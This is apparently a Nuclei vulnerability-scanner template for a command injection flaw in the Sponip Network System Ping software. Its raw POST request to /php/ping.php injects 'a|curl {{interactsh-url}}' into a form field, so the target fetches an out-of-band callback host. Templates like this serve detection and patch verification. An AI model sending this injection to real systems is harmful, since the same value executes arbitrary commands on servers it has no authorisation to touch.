id: sponip-network-system-ping-rce
info:
  name: Sponip Network System Ping - Remote Code Execution
  author: pikpikcu
  severity: critical
  description: The Sponip Network System Ping software allows for remote code execution,
    making it vulnerable to attacks.
  reference:
  - https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247486018&idx=1&sn=d744907475a4ea9ebeb26338c735e3e9
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: sponip,rce,oast,network
  metadata:
    impact: The vulnerability in Sponip Network System Ping's remote code execution
      has a significant impact on the security and functionality of the system.
    recommendation: I highly recommend immediately patching and securing Sponip Network
      System Ping to prevent potential remote code execution vulnerabilities.
requests:
- raw:
  - 'POST /php/ping.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    sondata[ip]=a|curl {{interactsh-url}}&jsondata[type]=1

    '
  matchers:
  - type: word
    part: interactsh_protocol
    name: http
    words:
    - http
